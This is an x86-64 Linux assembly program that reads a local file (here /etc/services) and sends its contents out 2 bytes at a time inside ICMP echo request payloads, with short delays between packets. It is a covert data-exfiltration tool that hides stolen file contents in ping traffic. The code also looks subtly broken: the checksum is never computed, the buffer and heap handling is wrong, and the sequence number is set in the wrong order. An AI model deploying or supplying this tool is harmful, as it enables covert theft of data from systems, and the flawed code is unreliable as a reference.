section .data    
    
    pathname db '/etc/services', 0                ; Pathname
    size_block dq 2                               ; Size of each data chunk (bytes)

    seq_n dw 1                                    ; Current sequence number

    req:
        dq 0              ; tv_sec  = 0 seconds
        dq 10000000        ; tv_nsec = 10000000 nanoseconds (10 ms)


    echo_request_header:
        db 8                     ; Type
        db 0                     ; Code
        dw 0                     ; Checksum
        dw 0                     ; Identifier 
        dw 0x0000                ; Sequence Number (net order)      
        

        ;             0        1        2        3        4        5        6        7
        ;         +--------+--------+--------+--------+--------+--------+--------+--------+
        ;         |  Type  |  Code  |    Checksum     |   Identifier    | Sequence Number |
        ;         +--------+--------+--------+--------+--------+--------+--------+--------+



        ; Echo Request Header: 08 00 00 00 00 00 00 01
        ; Max data = 1500 (MTU) - 20 (IP header) - 8 (ICMP header) = 1472 bytes


    sockaddr_in:
        dw 2                ; sin_family = AF_INET
        dw 0                ; sin_port = 0
        dd 0x00000000       ; sin_addr   = 0.0.0.0 (accepts from all interfaces)
        dq 0                ; sin_zero (padding) 


section .bss

        icmp_request resb 1480       ; Full ICMP packet buffer (header + payload)
        file_size resq 1             ; Total file size in bytes
        buff resq 1                  ; Pointer to heap-allocated read buffer

section .text

global _start
_start:

; Open target file

    ; OPEN
    mov rax, 2
    lea rdi, [rel pathname]
    xor rsi, rsi                 ; O_RDONLY = 0
    xor rdx, rdx                 ; mode = 0
    syscall

    mov r12, rax ; Save file descriptor

; Get file size

    ; LSEEK
    mov rax, 8
    mov rdi, r12
    xor rsi, rsi        ; offset = 0
    mov rdx, 2          ; SEEK_END
    syscall

    lea r13, [rel file_size]
    mov [r13], rax                 ; Store file size

; Allocate heap buffer

    ;BRK
    mov rax, 12
    xor rdi, rdi                   ; Query current program break
    syscall

    lea r13, [rel buff]
    mov [r13], rax                   ; Store heap buffer address

    mov r14, [rel size_block]
    mov rax, 12
    mov rdi, r13
    add rdi, r14                      ; Extend break by size_block bytes
    syscall

; Rewind file cursor to beginning

    ; LSEEK
    mov rax, 8
    mov rdi, r12
    xor rsi, rsi        ; offset = 0
    xor rdx, rdx        ; SEEK_SET
    syscall

; Create ICMP socket

    ; SOCKET
    mov rax, 41
    mov rdi, 2    ; AF_INET = 2 =  IPv4
    mov rsi, 2    ; SOCK_DGRAM = UPD Datagrams
    mov rdx, 1    ; IPPROTO_ICMP = ICMP Protocol
    syscall 

    ; rax < 0 error
    ; rax > FD

    mov r13, rax   ; Save socket fd

xor r14,r14
read_loop:

; Read next chunk from file

    ;READ
    mov rax, 0
    mov rdi, r12                    ; FD
    lea rsi, [rel buff]             ; Destination buffer
    mov rdx, [rel size_block]       ; Bytes to read
    syscall 
    add r14, rax                    ; Accumulate total bytes read

    lea r15, [rel buff]            

; Build ICMP packet 
data:
    call header_creation                ; Create ICMP header
                                        
                                        ; Create ICMP Data
    mov rsi, r15
    lea rdi, [rel icmp_request + 8]
    mov rcx, [rel size_block]     
    cld
    rep movsb


    mov ax, [rel seq_n]             ; Load current sequence number
    xchg al, ah                     ; Convert to network byte order (big-endian)
    mov word [rel echo_request_header + 6], ax

; Sleep between packets

    ; NANOSLEEP
    mov rax, 35
    lea rdi, [rel req]
    xor rsi, rsi
    syscall

; Send ICMP packet

    ; SENDTO
    mov rax, 44
    mov rdi, r13                     ; Socket fd
    lea rsi, [rel icmp_request]      ; Packet buffer
    mov rdx, 8                       ; Total length = header
    add rdx, [rel size_block]        ; Total length = header + payload
    xor r10, r10                     ; Flags = 0
    lea r8, [rel sockaddr_in]        ; Destination address
    mov r9, 16                       ; Address struct size
    syscall
    
    inc word [rel seq_n]

; Zero out read buffer for next iteration

    lea rdi, [rel buff]
    mov rcx, [rel size_block]   
    xor al, al                    ; Fill value = 0
    cld
    rep stosb          

; Loop until all bytes have been read

    cmp r14, [file_size]           
    jl read_loop                  
    
; Close file

    ; CLOSE
    mov rax, 3
    mov rdi, r12
    syscall

; Exit

    ; EXIT
    mov rax, 60
    xor rdi, rdi
    syscall

; Copy ICMP Echo Request header (8 bytes) into packet buffer
    header_creation:
        lea rsi, [rel echo_request_header]
        lea rdi, [rel icmp_request]
        mov rcx, 1     
        cld
        rep movsq
        ret